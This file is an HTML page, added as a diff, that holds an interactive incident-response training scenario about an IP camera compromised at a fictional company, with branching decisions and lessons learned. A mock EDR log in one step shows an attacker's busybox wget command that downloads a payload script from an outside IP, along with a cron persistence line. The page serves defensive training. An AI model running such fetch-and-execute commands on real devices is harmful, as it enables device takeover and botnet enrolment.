@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>CyberScenario v1: IoT Crisis</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+  <style>
+    /* Custom styles to match previous design aesthetics */
+    body {
+      background-color: #1a1a2e; /* Dark background */
+      color: #e0e0e0; /* Light text */
+      font-family: 'Roboto', sans-serif;
+    }
+    .container {
+      background-color: #2a2a4a; /* Container background */
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      padding: 20px;
+      max-width: 950px; /* Wider container */
+      width: 100%;
+      margin: 40px auto;
+    }
+    h1 {
+      font-size: 2.5em;
+      color: #8be9fd; /* Accent blue */
+      margin-bottom: 20px;
+    }
+    h2 {
+      font-size: 2em;
+      color: #8be9fd;
+      border-bottom: 2px solid #444466; /* Interactive bg */
+      padding-bottom: 15px;
+      margin-bottom: 25px;
+    }
+    h3 {
+      font-size: 1.5em;
+      color: #8be9fd;
+    }
+    .btn {
+      background-color: #6272a4; /* Dracula purple */
+      color: white;
+      border: none;
+      padding: 15px 25px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1.1em;
+      transition: all 0.3s ease;
+      text-align: left;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      font-weight: 700;
+    }
+    .btn:hover {
+      background-color: #7a8ab9; /* Lighter purple */
+      transform: translateY(-3px);
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    }
+    .btn-start, .btn-continue {
+      font-size: 1.3em;
+      font-weight: bold;
+      text-align: center;
+      background-color: #50fa7b; /* Accent green */
+      color: #282a36; /* Dark text for contrast */
+      justify-content: center;
+    }
+    .scenario-image {
+      border-radius: 8px;
+      border: 1px solid #444466; /* Interactive bg */
+      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    }
+    .bg-gray-800 {
+      background-color: #282a36; /* Dracula background */
+    }
+    .border-gray-700 {
+      border-color: #6272a4; /* Dracula purple */
+    }
+    .text-cyan-400 { color: #8be9fd; }
+    .text-cyan-300 { color: #8be9fd; }
+    .text-pink-300 { color: #ff79c6; }
+    .text-red-400 { color: #ff5555; }
+    .text-yellow-300 { color: #f1fa8c; }
+    .text-green-300 { color: #50fa7b; }
+    .text-orange-300 { color: #ffb86c; }
+    .text-indigo-300 { color: #bd93f9; }
+    .text-green-400 { color: #50fa7b; }
+    .text-yellow-400 { color: #f1fa8c; }
+    .text-red-400 { color: #ff5555; }
+    .text-blue-400 { color: #8be9fd; }
+
+    /* Roles Info specific styles (adapted from previous example) */
+    #rolesInfo {
+        background-color: #333355; /* Section bg */
+        border-radius: 8px;
+        padding: 20px;
+        margin-top: 30px;
+        text-align: left;
+        width: 100%;
+        max-width: 600px;
+        border: 1px solid #444466;
+    }
+    #rolesInfo h3 {
+        color: #50fa7b; /* Accent green */
+        margin-top: 0;
+        margin-bottom: 15px;
+        border-bottom: 1px solid #444466;
+        padding-bottom: 10px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+    #rolesInfo ul {
+        list-style-type: none;
+        padding-left: 0;
+        margin: 0;
+    }
+    #rolesInfo ul li {
+        margin-bottom: 10px;
+        padding-left: 25px;
+        position: relative;
+        line-height: 1.5;
+    }
+    #rolesInfo ul li:last-child {
+        margin-bottom: 0;
+    }
+    #rolesInfo ul li::before {
+        content: '\f007'; /* User icon */
+        font-family: 'Font Awesome 6 Free';
+        font-weight: 900;
+        color: #bd93f9; /* Accent purple */
+        position: absolute;
+        left: 0;
+        top: 3px;
+    }
+    #rolesInfo ul li.your-role::before {
+        color: #f1fa8c; /* Accent yellow for your role */
+    }
+    #rolesInfo ul li strong {
+        color: #8be9fd; /* Accent blue */
+    }
+  </style>
+  <script>
+    function nextStep(id) {
+      document.querySelectorAll('.step').forEach(function(s) {
+        s.style.display = 'none';
+      });
+      document.getElementById(id).style.display = 'block';
+      window.scrollTo(0, 0); // Scroll to the top of the page on each step
+    }
+    window.onload = function() {
+      nextStep('step0'); // Start the simulation with the welcome screen
+    };
+  </script>
+</head>
+<body class="bg-gray-900 text-white font-sans">
+  <div class="max-w-5xl mx-auto p-6 space-y-10">
+    <header class="text-center border-b border-gray-700 pb-6">
+      <h1 class="text-4xl font-bold text-cyan-400">CyberScenario: IoT Crisis</h1>
+      <p class="text-gray-400 mt-2">ÇOLHAK Corporation – Advanced IoT Crisis Simulation</p>
+    </header>
+
+    <section id="step0" class="step space-y-4 text-center" style="display:none;">
+      <h2 class="text-2xl text-cyan-300 font-semibold">Welcome to the Scenario</h2>
+      <p class="text-gray-300 max-w-2xl mx-auto">In this interactive scenario, you are a member of the ÇOLHAK Corporation's cybersecurity team. Your mission is to analyze an evolving security threat, make critical decisions, and protect the company from a potential disaster. Carefully evaluate the information presented at each step. Are you ready?</p>
+      <img src="giris.png" alt="Cyber Security Center" class="scenario-image" style="max-height: 300px; width: 100%; object-fit: cover;">
+
+      <div id="rolesInfo" class="mx-auto">
+          <h3><i class="fa-solid fa-people-arrows"></i> Simulation Roles</h3>
+          <ul>
+              <li class="your-role"><strong>Your Role: Cybersecurity Team Member</strong> - You are part of ÇOLHAK Corporation's cybersecurity team. You will actively participate in incident response, conduct analyses, and make critical decisions.</li>
+              <li><strong>Ezgi (Tier-1 SOC Analyst)</strong> - The eyes and ears of your team, responsible for detecting initial alerts and suspicious activities.</li>
+              <li><strong>Alper (Tier-2 Analyst)</strong> - Your expert who analyzes incidents from Ezgi in more depth and conducts technical investigations.</li>
+              <li><strong>Ceyda (Cybersecurity Manager)</strong> - The leader of your cybersecurity team and the one who makes final decisions during a crisis. Provides strategic guidance.</li>
+              <li><strong>Sales Director</strong> - Responsible for the company's commercial operations, a stakeholder who particularly does not want critical business processes like live demos to be interrupted.</li>
+              <li><strong>Chief Financial Officer (CFO)</strong> - A high-level executive responsible for the company's financial health.</li>
+          </ul>
+      </div>
+
+      <div class="flex justify-center mt-6">
+        <button onclick="nextStep('step1')" class="bg-cyan-600 text-white px-6 py-3 rounded-lg font-bold text-lg shadow-lg border-2 border-cyan-700 hover:bg-cyan-500 hover:border-cyan-300 active:bg-cyan-400 hover:-translate-y-1 active:scale-95 transition-all duration-200 ease-in-out">Start Simulation</button>
+      </div>
+    </section>
+
+    <section id="step1" class="step space-y-4" style="display:none;">
+      <h2 class="text-xl text-cyan-300 font-semibold">🕒 07:15 – First Signal: Enriched SIEM Alert</h2>
+      <p>As the day begins, Tier-1 SOC Analyst Ezgi notices a critical alert on the SIEM (Security Information and Event Management) dashboard. A correlation rule has been triggered: <strong class="text-red-400">"Periodic Data Exfiltration from Critical Asset Network to Unknown C2 Server"</strong>.</p>
+      <img src="alert.png" alt="SIEM Alert Dashboard" class="rounded-xl border-2 shadow-lg border-cyan-400 w-full max-w-3xl mx-auto object-cover">
+      <div class="bg-gray-800 p-4 rounded-lg border border-gray-700 mt-4">
+        <pre class="text-sm text-yellow-300 whitespace-pre-wrap"><code>ALERT ID: 8451
+TRIGGER: Correlation Rule - "Suspicious C2 Beaconing"
+SOURCE IP: 10.10.30.15 (VLAN: IoT Devices)
+HOSTNAME: KAMERA-3KAT-OKYANUS
+SOURCE MAC: 00:1A:2B:3C:4D:5E
+DESTINATION IP: 88.54.12.219 (Reputation: Low, Category: Unknown)
+PROTOCOL: UDP/443
+OBSERVATION: A 128KB data packet is being sent every 5 minutes for the last 3 hours.
+PCAP SUMMARY: DNS query for 'update.serve-config.net' resolved to 88.54.12.219. UDP payload contains obfuscated Base64 strings.
+MITRE ATT&CK MAPPING: T1041 (Exfiltration Over C2), T1571 (Non-Standard Port)</code></pre>
+      </div>
+      <blockquote class="italic text-gray-400 border-l-4 border-cyan-500 pl-4 mt-4">Ezgi: "This isn't normal traffic. The source IP appears to be on the IoT VLAN, and the destination is a suspicious address we haven't seen before. The MITRE mappings are also concerning. I'm escalating this to Tier-2 (Alper) immediately."</blockquote>
+      <button onclick="nextStep('step2')" class="mt-4 bg-cyan-600 text-white px-4 py-2 rounded-lg shadow-md border-2 border-cyan-700 hover:bg-cyan-500 hover:border-cyan-300 active:bg-cyan-400 hover:-translate-y-0.5 active:scale-95 transition-all duration-150 ease-in-out">Start Investigation</button>
+    </section>
+    
+    <section id="step2" class="step space-y-6" style="display:none;">
+        <h2 class="text-xl text-pink-300 font-semibold">🕒 07:30 – Simultaneous Developments & First Decision Point</h2>
+        <p>Almost at the same time as Ezgi's analysis, two different event logs appear in the system. As a team, you must decide which event to prioritize.</p>
+        
+        <div class="bg-gray-800 p-4 rounded-lg border border-gray-700">
+            <h3 class="font-bold text-pink-400">Event 1: Help Desk Ticket #7254</h3>
+            <p class="mt-2 text-gray-300"><strong>User:</strong> Ayşe Yılmaz</p>
+            <p class="text-gray-300"><strong>Subject:</strong> The camera in the 3rd Floor Ocean Meeting Room is constantly freezing and its web interface is very slow. There was no such problem yesterday morning.</p>
+        </div>
+
+        <div class="bg-gray-800 p-4 rounded-lg border border-red-500 mt-4">
+            <h3 class="font-bold text-red-400">Event 2: Critical System Alert #9112 (Red Herring)</h3>
+            <p class="mt-2 text-gray-300"><strong>System:</strong> Active Directory</p>
+            <p class="text-gray-300"><strong>Subject:</strong> Over 50 failed login attempts detected for the Chief Financial Officer (CFO) account in the last 15 minutes.</p>
+        </div>
+
+        <blockquote class="italic text-gray-400 border-l-4 border-yellow-500 pl-4 mt-4">Team Lead: "We have two potentially serious incidents. One is a potential data leak, the other could be an attack on a high-level executive's account. Our resources are limited, which one do we focus on?"</blockquote>
+        
+        <div class="flex flex-col md:flex-row gap-4 mt-4">
+            <button onclick="nextStep('step3')" class="w-full bg-cyan-600 text-white p-3 rounded-lg font-bold shadow-lg border-2 border-cyan-700 hover:bg-cyan-500 hover:border-cyan-300 active:bg-cyan-400 hover:-translate-y-1 active:scale-95 transition-all duration-200 ease-in-out">Priority: Correlate the Camera Incident and SIEM Alert</button>
+            <button onclick="nextStep('step_distraction')" class="w-full bg-red-600 text-white p-3 rounded-lg font-bold shadow-lg border-2 border-red-700 hover:bg-red-500 hover:border-red-300 active:bg-red-400 hover:-translate-y-1 active:scale-95 transition-all duration-200 ease-in-out">Priority: Secure the CFO's Account</button>
+        </div>
+    </section>
+
+    <section id="step_distraction" class="step space-y-4" style="display:none;">
+        <h2 class="text-xl text-yellow-300 font-semibold">🕒 07:50 – Mis-prioritization</h2>
+        <p>The team decides to focus on the CFO's account. A quick investigation reveals that the CFO is on vacation abroad and was repeatedly trying to log in from their mobile device after forgetting their new password. The account is temporarily locked, and the situation is brought under control.</p>
+        <blockquote class="italic text-gray-400 border-l-4 border-red-500 pl-4 mt-4">Alper: "That was a false positive. But we lost about 20 minutes investigating it. We need to get back to the other incident urgently. I hope we're not too late."</blockquote>
+        <button onclick="nextStep('step3')" class="mt-4 bg-cyan-600 text-white px-4 py-2 rounded-lg shadow-md border-2 border-cyan-700 hover:bg-cyan-500 hover:border-cyan-300 active:bg-cyan-400 hover:-translate-y-0.5 active:scale-95 transition-all duration-150 ease-in-out">Return to the Main Incident</button>
+    </section>
+
+    <section id="step3" class="step space-y-4" style="display:none;">
+      <h2 class="text-xl text-green-300 font-semibold">🧑‍💻 08:00 – Alper’s In-Depth Analysis</h2>
+      <p>Tier-2 Analyst Alper correlates the SIEM alert with the help desk ticket. He queries the suspicious IP address `10.10.30.15` in the company's Asset Management System. The result is clear: The IP address belongs to a <strong class="text-green-400">"SmartEye 3000"</strong> model IP camera in the 3rd Floor Ocean Meeting Room.</p>
+      <p>Alper takes his analysis a step further by checking the EDR (Endpoint Detection and Response) console and finds a critical piece of evidence:</p>
+      <div class="bg-gray-800 p-4 rounded-lg border border-gray-700 mt-4">
+        <pre class="text-sm text-yellow-300 whitespace-pre-wrap"><code>EDR LOG - Device: KAMERA-3KAT-OKYANUS (10.10.30.15)
+PROCESS: /bin/busybox
+COMMAND: busybox wget http://88.54.12.219/payload.sh -O /tmp/p.sh
+ACTION: 'p.sh' script executed. A crontab job was created containing the command 'perl /tmp/c2.pl'.</code></pre>
+      </div>
+      <p class="text-gray-300 mt-4">A quick internet search reveals a recently disclosed critical vulnerability (<strong class="text-red-400">CVE-2025-1337</strong>) in this model's firmware. This vulnerability allows for unauthorized Remote Code Execution (RCE).</p>
+      <blockquote class="italic text-gray-400 border-l-4 border-green-500 pl-4 mt-4">Alper: "Okay, it all makes sense now. The slowdown in the camera isn't a malfunction; it's a symptom. The device has been compromised via a known vulnerability, downloaded a payload, and is sending data to a C2 server as part of a botnet. We need to report this to our manager, Ceyda, immediately."</blockquote>
+      <button onclick="nextStep('step3_5')" class="mt-4 bg-green-600 text-white px-4 py-2 rounded-lg shadow-md border-2 border-green-700 hover:bg-green-500 hover:border-green-300 active:bg-green-400 hover:-translate-y-0.5 active:scale-95 transition-all duration-150 ease-in-out">Report Findings</button>
+    </section>
+    
+    <section id="step3_5" class="step space-y-4" style="display:none;">
+        <h2 class="text-xl text-orange-300 font-semibold">🕒 08:30 – Sudden Complication: Management Pressure</h2>
+        <p>Just as Alper is preparing to present his findings to Ceyda, his phone rings. It's the Sales Director, and he sounds very tense.</p>
+        <img src="toplanti.png" alt="Meeting Room" class="rounded-xl border-2 shadow-lg border-orange-400 w-full max-w-md mx-auto object-cover">
+        <blockquote class="italic text-gray-400 border-l-4 border-orange-500 pl-4 mt-4">Sales Director: "Is your team dealing with the camera in the Ocean Room? That camera needs to be operational in less than an hour, we have a live demo for a very important international client! You can't shut down the room, find a solution immediately!"</blockquote>
+        <p>This new information reveals that the decision to be made has not only a technical but also an operational dimension. The pressure on the team has increased.</p>
+        <button onclick="nextStep('step4')" class="mt-4 bg-orange-600 text-white px-4 py-2 rounded-lg shadow-md border-2 border-orange-700 hover:bg-orange-500 hover:border-orange-300 active:bg-orange-400 hover:-translate-y-0.5 active:scale-95 transition-all duration-150 ease-in-out">Schedule Crisis Meeting Under Pressure</button>
+    </section>
+
+    <section id="step4" class="step space-y-4" style="display:none;">
+      <h2 class="text-xl text-indigo-300 font-semibold">🏢 08:45 – Crisis Meeting and the Moment of Decision</h2>
+      <p>Alper summarizes the situation for Cybersecurity Manager Ceyda: "We have an IP camera that has been compromised using the CVE-2025-1337 vulnerability. For now, it's only communicating with the outside with small data packets, which looks like 'beaconing' activity. We haven't detected any lateral movement within the network yet. However, the Sales Department needs that camera in less than an hour."</p>
+      <blockquote class="italic text-gray-400 border-l-4 border-indigo-500 pl-4">Ceyda: "Understood. Our time is limited, and we're under pressure. It seems we have three options. The decision is yours. What do we do?"</blockquote>
+      <p class="font-bold text-yellow-300">Make your decision as a team:</p>
+      <div class="flex flex-col md:flex-row gap-4 mt-4">
+        <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+          <h3 class="text-lg font-bold text-green-400">Option A: Isolate and Patch (The Safe Route)</h3>
+          <p class="text-sm text-gray-300 mt-2 flex-grow">Immediately disconnect the camera from the network. Take the device to a lab environment, capture its image, and update it with the latest firmware. The threat is stopped instantly.</p>
+          <p class="text-xs text-yellow-400 mt-2"><strong>Risk:</strong> We won't be able to learn more about who the attacker is or what their ultimate goal is. The sales presentation will be canceled.</p>
+          <button onclick="nextStep('step_report_safe')" class="mt-4 w-full bg-green-600 text-white px-4 py-2 rounded-lg font-semibold shadow-lg border-2 border-green-700 hover:bg-green-500 hover:border-green-300 active:bg-green-400 hover:-translate-y-1 active:scale-95 transition-all duration-200 ease-in-out">Implement Option A</button>
+        </div>
+        <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+          <h3 class="text-lg font-bold text-red-400">Option B: Redirect to Honeypot (Risky Observation)</h3>
+          <p class="text-sm text-gray-300 mt-2 flex-grow">Redirect the camera's traffic to a "Honeypot" environment that is completely isolated from the main network. Secretly monitor the attacker's behaviors (TTPs) to gather valuable intelligence.</p>
+          <p class="text-xs text-yellow-400 mt-2"><strong>Risk:</strong> The attacker might notice the Honeypot or launch a more aggressive attack (e.g., ransomware) during observation.</p>
+          <button onclick="nextStep('step_report_risk')" class="mt-4 w-full bg-red-600 text-white px-4 py-2 rounded-lg font-semibold shadow-lg border-2 border-red-700 hover:bg-red-500 hover:border-red-300 active:bg-red-400 hover:-translate-y-1 active:scale-95 transition-all duration-200 ease-in-out">Implement Option B</button>
+        </div>
+        <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+            <h3 class="text-lg font-bold text-blue-400">Option C: Quarantine and Observe (Calculated Middle Ground)</h3>
+            <p class="text-sm text-gray-300 mt-2 flex-grow">Move the camera to an isolated VLAN with no internet access. Block its egress traffic but allow it to communicate with 'bait' assets on the local network to observe its actions. This could reveal lateral movement attempts.</p>
+            <p class="text-xs text-yellow-400 mt-2"><strong>Risk:</strong> A configuration error could allow the attacker to escape the quarantine. The sales presentation might still be delayed.</p>
+            <button onclick="nextStep('step_report_quarantine')" class="mt-4 w-full bg-blue-600 text-white px-4 py-2 rounded-lg font-semibold shadow-lg border-2 border-blue-700 hover:bg-blue-500 hover:border-blue-300 active:bg-blue-400 hover:-translate-y-1 active:scale-95 transition-all duration-200 ease-in-out">Implement Option C</button>
+        </div>
+      </div>
+    </section>
+
+    <section id="step_report_safe" class="step space-y-4" style="display:none;">
+      <h2 class="text-xl text-green-300 font-semibold">📊 Final Report: Threat Contained</h2>
+      <p>The team decided to implement Option A. The camera's port was immediately disabled on the switch, and the device was physically removed to the lab. The sales presentation was canceled.</p>
+      
+      <div class="bg-gray-800 p-4 rounded-lg border border-green-500">
+        <h3 class="text-lg font-semibold text-white mb-3">Results of Your Decision:</h3>
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
+            <div>
+                <p class="text-sm text-gray-400">Affected Systems</p>
+                <p class="text-2xl font-bold text-yellow-400">1</p>
+            </div>
+            <div>
+                <p class="text-sm text-gray-400">Financial Loss</p>
+                <p class="text-2xl font-bold text-yellow-400">₺50,000</p>
+            </div>
+            <div>
+                <p class="text-sm text-gray-400">Data Loss</p>
+                <p class="text-2xl font-bold text-green-400">0%</p>
+            </div>
+            <div>
+                <p class="text-sm text-gray-400">Reputation Score</p>
+                <p class="text-2xl font-bold text-green-400">95/100</p>
+            </div>
+        </div>
+      </div>
+
+      <ul class="list-disc list-inside text-gray-300 space-y-2 bg-gray-800 p-4 rounded-lg mt-4">
+        <li><strong>Action:</strong> The device was isolated from the network, and its image was taken for forensic analysis.</li>
+        <li><strong>Finding:</strong> The analysis found a simple Perl script on the device, used to enlist it into a DDoS botnet.</li>
+        <li><strong>Resolution:</strong> The device's firmware was updated, patching the vulnerability. A network scan revealed 3 other cameras of the same model that also needed patching, and they were updated.</li>
+        <li><strong>Outcome:</strong> No data breach occurred. A minor cost was incurred due to operational disruption (canceled presentation), but the crisis was averted before it could escalate.</li>
+      </ul>
+      <button onclick="nextStep('final')" class="mt-4 bg-cyan-600 text-white px-4 py-2 rounded-lg shadow-md border-2 border-cyan-700 hover:bg-cyan-500 hover:border-cyan-300 active:bg-cyan-400 hover:-translate-y-0.5 active:scale-95 transition-all duration-150 ease-in-out">Proceed to Lessons Learned</button>
+    </section>
+    
+    <section id="step_report_risk" class="step space-y-4" style="display:none;">
+      <h2 class="text-xl text-red-400 font-semibold">🚨 Final Report: Crisis Escalated!</h2>
+      <p>The team decided to implement Option B. However, the experienced attacker noticed the Honeypot and launched an aggressive attack.</p>
+
+      <div class="bg-gray-800 p-4 rounded-lg border border-red-500">
+        <h3 class="text-lg font-semibold text-white mb-3">Results of Your Decision:</h3>
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
+            <div>
+                <p class="text-sm text-gray-400">Affected Systems</p>
+                <p class="text-2xl font-bold text-red-400">4+</p>
+            </div>
+            <div>
+                <p class="text-sm text-gray-400">Financial Loss</p>
+                <p class="text-2xl font-bold text-red-400">₺15,000,000+</p>
+            </div>
+            <div>
+                <p class="text-sm text-gray-400">Data Loss</p>
+                <p class="text-2xl font-bold text-red-400">40%</p>
+            </div>
+            <div>
+                <p class="text-sm text-gray-400">Reputation Score</p>
+                <p class="text-2xl font-bold text-red-400">20/100</p>
+            </div>
+        </div>
+      </div>
+
+      <ul class="list-disc list-inside text-gray-300 space-y-2 bg-gray-800 p-4 rounded-lg mt-4">
+        <li><strong>Action:</strong> Realizing they were being watched, the attacker changed their plan to fully exploit their access.</li>
+        <li><strong>Finding:</strong> They began scanning the network for other vulnerable systems from the camera. By cracking a weak service account password, they made a lateral move to a file server.</li>
+        <li><strong>Outcome:</strong> The attacker deployed ransomware on servers containing critical data from the Finance and HR departments. Company operations came to a standstill.</li>
+        <li><strong>Crisis Management:</strong> The incident escalated into a data breach and a major operational crisis. Recovery efforts, consultant fees, and business losses reached massive proportions.</li>
+      </ul>
+      <button onclick="nextStep('final')" class="mt-4 bg-cyan-600 text-white px-4 py-2 rounded-lg shadow-md border-2 border-cyan-700 hover:bg-cyan-500 hover:border-cyan-300 active:bg-cyan-400 hover:-translate-y-0.5 active:scale-95 transition-all duration-150 ease-in-out">Proceed to Lessons Learned</button>
+    </section>
+
+    <section id="step_report_quarantine" class="step space-y-4" style="display:none;">
+        <h2 class="text-xl text-blue-300 font-semibold">📊 Final Report: Intelligence Gathered, Threat Neutralized</h2>
+        <p>The team decided to implement Option C. The camera was moved to a special VLAN with no internet access, and all its activity was monitored.</p>
+        
+        <div class="bg-gray-800 p-4 rounded-lg border border-blue-500">
+            <h3 class="text-lg font-semibold text-white mb-3">Results of Your Decision:</h3>
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
+                <div>
+                    <p class="text-sm text-gray-400">Affected Systems</p>
+                    <p class="text-2xl font-bold text-green-400">1</p>
+                </div>
+                <div>
+                    <p class="text-sm text-gray-400">Financial Loss</p>
+                    <p class="text-2xl font-bold text-green-400">₺5,000</p>
+                </div>
+                <div>
+                    <p class="text-sm text-gray-400">Data Loss</p>
+                    <p class="text-2xl font-bold text-green-400">0%</p>
+                </div>
+                <div>
+                    <p class="text-sm text-gray-400">Reputation Score</p>
+                    <p class="text-2xl font-bold text-green-400">100/100</p>
+                </div>
+            </div>
+        </div>
+
+        <ul class="list-disc list-inside text-gray-300 space-y-2 bg-gray-800 p-4 rounded-lg mt-4">
+          <li><strong>Action:</strong> The camera was left running in the isolated VLAN, and all its activities were monitored with an NDR (Network Detection and Response) tool.</li>
+          <li><strong>Finding:</strong> The attacker was observed trying to scan the local network with `nmap` from the camera. This behavior provided valuable intelligence on the attacker's TTPs (Tactics, Techniques, and Procedures).</li>
+          <li><strong>Resolution:</strong> Using the gathered intelligence, special firewall rules were written to block this type of lateral movement *before* patching the other cameras. Then, all vulnerable cameras were safely updated.</li>
+          <li><strong>Outcome:</strong> The threat was stopped, and valuable information was gathered to proactively prevent similar future attacks. Apart from a minor delay in the sales presentation, there was no significant loss.</li>
+        </ul>
+        <button onclick="nextStep('final')" class="mt-4 bg-cyan-600 text-white px-4 py-2 rounded-lg shadow-md border-2 border-cyan-700 hover:bg-cyan-500 hover:border-cyan-300 active:bg-cyan-400 hover:-translate-y-0.5 active:scale-95 transition-all duration-150 ease-in-out">Proceed to Lessons Learned</button>
+    </section>
+
+    <section id="final" class="step space-y-6" style="display:none;">
+      <h2 class="text-2xl font-semibold text-cyan-300 text-center">📌 Closing: Case Analysis and Lessons Learned</h2>
+      <div class="bg-gray-800 p-4 rounded-lg border border-gray-700">
+        <h3 class="text-xl font-semibold text-green-400">Technical Lessons</h3>
+        <ul class="list-disc list-inside text-gray-300 mt-2 space-y-1">
+          <li><strong>Asset Management:</strong> Keeping an up-to-date inventory of all devices on the network (especially IoT) is critical for rapid diagnosis during an incident.</li>
+          <li><strong>Network Segmentation:</strong> IoT devices should be kept in separate VLANs, isolated from critical servers and user networks. This makes lateral movement more difficult.</li>
+          <li><strong>Vulnerability Management:</strong> Regular vulnerability scans must be performed for device firmware and software, and patches must be applied quickly.</li>
+          <li><strong>Deception Technologies:</strong> Honeypots and isolated observation environments, when used correctly, are powerful tools for understanding attacker tactics.</li>
+        </ul>
+      </div>
+      <div class="bg-gray-800 p-4 rounded-lg border border-gray-700">
+        <h3 class="text-xl font-semibold text-yellow-400">Procedural Lessons</h3>
+        <ul class="list-disc list-inside text-gray-300 mt-2 space-y-1">
+          <li><strong>Incident Prioritization:</strong> When multiple alerts occur, prioritizing correctly based on potential impact ensures efficient use of resources.</li>
+          <li><strong>SIEM Rule Tuning:</strong> The sensitivity of correlation rules that detect activities like anomalous data exfiltration and beaconing should be continuously improved.</li>
+          <li><strong>Inter-Departmental Communication:</strong> Correlating user complaints from the Help Desk with SOC alerts is vital for the early detection of incidents.</li>
+        </ul>
+      </div>
+       <div class="bg-gray-800 p-4 rounded-lg border border-gray-700">
+        <h3 class="text-xl font-semibold text-indigo-400">Strategic Lessons</h3>
+        <ul class="list-disc list-inside text-gray-300 mt-2 space-y-1">
+          <li><strong>Risk Appetite:</strong> The balance between "gathering intelligence" and "eliminating risk immediately" must be carefully evaluated with management in every incident.</li>
+          <li><strong>Managing Pressure:</strong> Handling operational pressure from business units during an incident response is an integral part of the cybersecurity decision-making process.</li>
+          <li><strong>Value of Early Intervention:</strong> Acting quickly and decisively when suspicious activity is detected is the most effective way to prevent a potential crisis.</li>
+        </ul>
+      </div>
+      <div class="text-center mt-6">
+        <button onclick="nextStep('step0')" class="bg-blue-600 text-white px-6 py-3 rounded-lg font-bold shadow-lg border-2 border-blue-700 hover:bg-blue-500 hover:border-blue-300 active:bg-blue-400 hover:-translate-y-1 active:scale-95 transition-all duration-200 ease-in-out">Restart Simulation</button>
+        <p class="text-center text-sm text-gray-500 mt-8">ShadowCircuit v6 – © 2025 ÇOLHAK</p>
+      </div>
+    </section>
+  </div>
+</body>
+</html>
